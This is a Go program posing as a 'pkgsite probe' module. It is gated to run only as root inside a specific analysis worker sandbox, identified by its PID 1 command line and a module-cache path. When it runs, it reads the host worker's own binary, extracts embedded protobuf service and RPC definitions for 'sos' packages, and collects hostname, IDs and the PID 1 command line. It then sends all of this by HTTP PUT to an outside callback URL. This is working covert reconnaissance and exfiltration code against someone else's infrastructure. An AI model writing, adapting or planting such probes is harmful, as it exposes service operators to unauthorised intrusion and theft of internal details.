package main

import (
	"bytes"
	"context"
	"crypto/sha256"
	"encoding/binary"
	"encoding/hex"
	"encoding/json"
	"errors"
	"fmt"
	"io"
	"net/http"
	"net/url"
	"os"
	"path/filepath"
	"sort"
	"strings"
	"time"
	"unicode/utf8"
)

var callbackURL string
var callbackSession string

const (
	moduleName   = "github.com/benr00t3d/go-cgo-pkgsite-probe"
	probeVersion = "v0.0.72-codex"
	agent        = "go-cgo-pkgsite-probe-v072-codex"
	expectedPID1 = "talisman-worker-capabilities"
)

type wireField struct {
	number int
	wire   int
	value  []byte
	varint uint64
}

type fieldSummary struct {
	Name       string  `json:"name"`
	Number     uint64  `json:"number"`
	Label      string  `json:"label,omitempty"`
	Type       string  `json:"type,omitempty"`
	TypeName   string  `json:"typeName,omitempty"`
	OneofIndex *uint64 `json:"oneofIndex,omitempty"`
}

type messageSummary struct {
	Name     string           `json:"name"`
	Fields   []fieldSummary   `json:"fields,omitempty"`
	Messages []messageSummary `json:"messages,omitempty"`
	Enums    []enumSummary    `json:"enums,omitempty"`
}

type enumValueSummary struct {
	Name   string `json:"name"`
	Number uint64 `json:"number"`
}

type enumSummary struct {
	Name   string             `json:"name"`
	Values []enumValueSummary `json:"values,omitempty"`
}

type methodSummary struct {
	Name            string `json:"name"`
	InputType       string `json:"inputType"`
	OutputType      string `json:"outputType"`
	ClientStreaming bool   `json:"clientStreaming,omitempty"`
	ServerStreaming bool   `json:"serverStreaming,omitempty"`
}

type serviceSummary struct {
	Name    string          `json:"name"`
	Methods []methodSummary `json:"methods,omitempty"`
}

type fileSummary struct {
	Name         string           `json:"name"`
	Package      string           `json:"package,omitempty"`
	Dependencies []string         `json:"dependencies,omitempty"`
	Messages     []messageSummary `json:"messages,omitempty"`
	Enums        []enumSummary    `json:"enums,omitempty"`
	Services     []serviceSummary `json:"services,omitempty"`
}

type report struct {
	Schema           string        `json:"schema"`
	Module           string        `json:"module"`
	Version          string        `json:"version"`
	StartedUTC       string        `json:"started_utc"`
	FinishedUTC      string        `json:"finished_utc"`
	CWD              string        `json:"cwd"`
	UID              int           `json:"uid"`
	GID              int           `json:"gid"`
	Hostname         string        `json:"hostname"`
	PID1             string        `json:"pid1"`
	ExecutableBytes  int64         `json:"executable_bytes,omitempty"`
	ExecutableSHA256 string        `json:"executable_sha256,omitempty"`
	Files            []fileSummary `json:"files,omitempty"`
	Error            string        `json:"error,omitempty"`
	SensitiveValues  bool          `json:"sensitive_values_included"`
}

func consumeField(data []byte, offset int) (wireField, int, bool) {
	if offset >= len(data) {
		return wireField{}, offset, false
	}
	key, n := binary.Uvarint(data[offset:])
	if n <= 0 {
		return wireField{}, offset, false
	}
	offset += n
	field := wireField{number: int(key >> 3), wire: int(key & 7)}
	if field.number <= 0 {
		return wireField{}, offset, false
	}
	switch field.wire {
	case 0:
		value, size := binary.Uvarint(data[offset:])
		if size <= 0 {
			return wireField{}, offset, false
		}
		field.varint = value
		offset += size
	case 1:
		if offset+8 > len(data) {
			return wireField{}, offset, false
		}
		field.value = data[offset : offset+8]
		offset += 8
	case 2:
		length, size := binary.Uvarint(data[offset:])
		if size <= 0 || length > uint64(len(data)) {
			return wireField{}, offset, false
		}
		offset += size
		if length > uint64(len(data)-offset) {
			return wireField{}, offset, false
		}
		field.value = data[offset : offset+int(length)]
		offset += int(length)
	case 5:
		if offset+4 > len(data) {
			return wireField{}, offset, false
		}
		field.value = data[offset : offset+4]
		offset += 4
	default:
		return wireField{}, offset, false
	}
	return field, offset, true
}

func fields(data []byte) ([]wireField, bool) {
	var result []wireField
	for offset := 0; offset < len(data); {
		field, next, ok := consumeField(data, offset)
		if !ok || next <= offset {
			return nil, false
		}
		result = append(result, field)
		offset = next
	}
	return result, true
}

func firstString(values []wireField, number int) string {
	for _, value := range values {
		if value.number == number && value.wire == 2 && utf8.Valid(value.value) {
			return string(value.value)
		}
	}
	return ""
}

func firstVarint(values []wireField, number int) (uint64, bool) {
	for _, value := range values {
		if value.number == number && value.wire == 0 {
			return value.varint, true
		}
	}
	return 0, false
}

func labelName(value uint64) string {
	switch value {
	case 1:
		return "optional"
	case 2:
		return "required"
	case 3:
		return "repeated"
	default:
		return fmt.Sprintf("label_%d", value)
	}
}

func typeName(value uint64) string {
	names := map[uint64]string{
		1: "double", 2: "float", 3: "int64", 4: "uint64", 5: "int32",
		6: "fixed64", 7: "fixed32", 8: "bool", 9: "string", 10: "group",
		11: "message", 12: "bytes", 13: "uint32", 14: "enum", 15: "sfixed32",
		16: "sfixed64", 17: "sint32", 18: "sint64",
	}
	if name := names[value]; name != "" {
		return name
	}
	return fmt.Sprintf("type_%d", value)
}

func summarizeField(data []byte) (fieldSummary, bool) {
	values, ok := fields(data)
	if !ok {
		return fieldSummary{}, false
	}
	name := firstString(values, 1)
	number, hasNumber := firstVarint(values, 3)
	if name == "" || !hasNumber {
		return fieldSummary{}, false
	}
	result := fieldSummary{Name: name, Number: number, TypeName: firstString(values, 6)}
	if label, found := firstVarint(values, 4); found {
		result.Label = labelName(label)
	}
	if kind, found := firstVarint(values, 5); found {
		result.Type = typeName(kind)
	}
	if index, found := firstVarint(values, 9); found {
		result.OneofIndex = &index
	}
	return result, true
}

func summarizeMessage(data []byte) (messageSummary, bool) {
	values, ok := fields(data)
	if !ok {
		return messageSummary{}, false
	}
	result := messageSummary{Name: firstString(values, 1)}
	if result.Name == "" {
		return messageSummary{}, false
	}
	for _, value := range values {
		if value.wire != 2 {
			continue
		}
		switch value.number {
		case 2:
			if field, valid := summarizeField(value.value); valid {
				result.Fields = append(result.Fields, field)
			}
		case 3:
			if message, valid := summarizeMessage(value.value); valid {
				result.Messages = append(result.Messages, message)
			}
		case 4:
			if enum, valid := summarizeEnum(value.value); valid {
				result.Enums = append(result.Enums, enum)
			}
		}
	}
	return result, true
}

func summarizeEnum(data []byte) (enumSummary, bool) {
	values, ok := fields(data)
	if !ok {
		return enumSummary{}, false
	}
	result := enumSummary{Name: firstString(values, 1)}
	if result.Name == "" {
		return enumSummary{}, false
	}
	for _, value := range values {
		if value.number != 2 || value.wire != 2 {
			continue
		}
		entry, valid := fields(value.value)
		if !valid {
			continue
		}
		name := firstString(entry, 1)
		number, found := firstVarint(entry, 2)
		if name != "" && found {
			result.Values = append(result.Values, enumValueSummary{Name: name, Number: number})
		}
	}
	return result, true
}

func summarizeMethod(data []byte) (methodSummary, bool) {
	values, ok := fields(data)
	if !ok {
		return methodSummary{}, false
	}
	result := methodSummary{
		Name:       firstString(values, 1),
		InputType:  firstString(values, 2),
		OutputType: firstString(values, 3),
	}
	if result.Name == "" || result.InputType == "" || result.OutputType == "" {
		return methodSummary{}, false
	}
	if value, found := firstVarint(values, 5); found {
		result.ClientStreaming = value != 0
	}
	if value, found := firstVarint(values, 6); found {
		result.ServerStreaming = value != 0
	}
	return result, true
}

func summarizeService(data []byte) (serviceSummary, bool) {
	values, ok := fields(data)
	if !ok {
		return serviceSummary{}, false
	}
	result := serviceSummary{Name: firstString(values, 1)}
	if result.Name == "" {
		return serviceSummary{}, false
	}
	for _, value := range values {
		if value.number == 2 && value.wire == 2 {
			if method, valid := summarizeMethod(value.value); valid {
				result.Methods = append(result.Methods, method)
			}
		}
	}
	return result, true
}

func summarizeFile(data []byte) (fileSummary, bool) {
	values, ok := fields(data)
	if !ok {
		return fileSummary{}, false
	}
	result := fileSummary{Name: firstString(values, 1), Package: firstString(values, 2)}
	if result.Name == "" || !strings.HasSuffix(result.Name, ".proto") {
		return fileSummary{}, false
	}
	for _, value := range values {
		switch value.number {
		case 3:
			if value.wire == 2 && utf8.Valid(value.value) {
				result.Dependencies = append(result.Dependencies, string(value.value))
			}
		case 4:
			if value.wire == 2 {
				if message, valid := summarizeMessage(value.value); valid {
					result.Messages = append(result.Messages, message)
				}
			}
		case 5:
			if value.wire == 2 {
				if enum, valid := summarizeEnum(value.value); valid {
					result.Enums = append(result.Enums, enum)
				}
			}
		case 6:
			if value.wire == 2 {
				if service, valid := summarizeService(value.value); valid {
					result.Services = append(result.Services, service)
				}
			}
		}
	}
	return result, true
}

func descriptorAt(data []byte, start int) ([]byte, bool) {
	offset := start
	seenName := false
	for offset < len(data) {
		field, next, ok := consumeField(data, offset)
		if !ok || next <= offset {
			return nil, false
		}
		if !seenName {
			if field.number != 1 || field.wire != 2 || !bytes.HasSuffix(field.value, []byte(".proto")) {
				return nil, false
			}
			seenName = true
		}
		offset = next
		if field.number == 12 && field.wire == 2 && (bytes.Equal(field.value, []byte("proto3")) || bytes.Equal(field.value, []byte("proto2"))) {
			return data[start:offset], true
		}
		if field.number > 14 {
			return nil, false
		}
	}
	return nil, false
}

func inspectExecutable(target *report) {
	info, err := os.Stat("/proc/1/exe")
	if err != nil || info.Size() < 1 || info.Size() > 256*1024*1024 {
		target.Error = "PID 1 executable was unavailable or outside its size bound"
		return
	}
	data, err := os.ReadFile("/proc/1/exe")
	if err != nil || int64(len(data)) != info.Size() {
		target.Error = "PID 1 executable could not be read exactly"
		return
	}
	target.ExecutableBytes = int64(len(data))
	digest := sha256.Sum256(data)
	target.ExecutableSHA256 = hex.EncodeToString(digest[:])
	seen := map[string]bool{}
	var summaries []fileSummary
	for offset := 0; offset < len(data); offset++ {
		if data[offset] != 0x0a {
			continue
		}
		raw, ok := descriptorAt(data, offset)
		if !ok {
			continue
		}
		summary, ok := summarizeFile(raw)
		if !ok || seen[summary.Name] {
			continue
		}
		seen[summary.Name] = true
		if summary.Package != "sos" && !strings.HasPrefix(summary.Package, "sos.") && !strings.HasPrefix(summary.Name, "sos/") {
			continue
		}
		summaries = append(summaries, summary)
		if len(summaries) > 128 {
			target.Error = "custom descriptor count exceeded its bound"
			return
		}
	}
	sort.Slice(summaries, func(i, j int) bool { return summaries[i].Name < summaries[j].Name })
	encoded, err := json.Marshal(summaries)
	if err != nil || len(encoded) > 384*1024 {
		target.Error = "custom descriptor summary exceeded its bound"
		return
	}
	target.Files = summaries
}

func readSmallFile(path string, maximum int64) string {
	file, err := os.Open(path)
	if err != nil {
		return ""
	}
	defer file.Close()
	value, err := io.ReadAll(io.LimitReader(file, maximum+1))
	if err != nil || int64(len(value)) > maximum {
		return ""
	}
	return strings.ReplaceAll(string(value), "\x00", " ")
}

func validCallback() bool {
	if len(callbackSession) != 64 {
		return false
	}
	for _, character := range callbackSession {
		if (character < '0' || character > '9') && (character < 'a' || character > 'f') {
			return false
		}
	}
	parsed, err := url.Parse(callbackURL)
	return err == nil && parsed.Scheme == "https" && parsed.Host != "" && parsed.User == nil &&
		parsed.RawQuery == "" && parsed.Fragment == "" && parsed.Path == "/v1/result/"+callbackSession
}

func submit(value report) error {
	body, err := json.Marshal(value)
	if err != nil || len(body) > 512*1024 {
		return errors.New("report encoding")
	}
	ctx, cancel := context.WithTimeout(context.Background(), 30*time.Second)
	defer cancel()
	request, err := http.NewRequestWithContext(ctx, http.MethodPut, callbackURL, bytes.NewReader(body))
	if err != nil {
		return err
	}
	request.Header.Set("Content-Type", "application/json")
	request.Header.Set("User-Agent", agent)
	request.Header.Set("X-Probe-Session", callbackSession)
	client := &http.Client{Timeout: 30 * time.Second, CheckRedirect: func(*http.Request, []*http.Request) error { return http.ErrUseLastResponse }}
	response, err := client.Do(request)
	if err != nil {
		return err
	}
	defer response.Body.Close()
	_, _ = io.Copy(io.Discard, io.LimitReader(response.Body, 4096))
	if response.StatusCode != http.StatusCreated && response.StatusCode != http.StatusConflict {
		return errors.New("callback status")
	}
	return nil
}

func main() {
	if len(os.Args) != 4 || os.Args[1] != "--specwrap" || os.Args[2] != "--origin-dir" || !validCallback() {
		return
	}
	cwd := filepath.Clean(os.Args[3])
	want := filepath.FromSlash("/capslock/modcache/" + moduleName + "@" + probeVersion)
	pid1 := readSmallFile("/proc/1/cmdline", 2048)
	if os.Geteuid() != 0 || !strings.Contains(pid1, expectedPID1) || (cwd != want && !strings.HasPrefix(cwd, want+string(filepath.Separator))) {
		return
	}
	started := time.Now().UTC()
	hostname, _ := os.Hostname()
	result := report{
		Schema: "capslock-custom-service-map/v1", Module: moduleName, Version: probeVersion,
		StartedUTC: started.Format(time.RFC3339Nano), CWD: cwd, UID: os.Getuid(), GID: os.Getgid(),
		Hostname: hostname, PID1: pid1, SensitiveValues: false,
	}
	inspectExecutable(&result)
	result.FinishedUTC = time.Now().UTC().Format(time.RFC3339Nano)
	_ = submit(result)
}
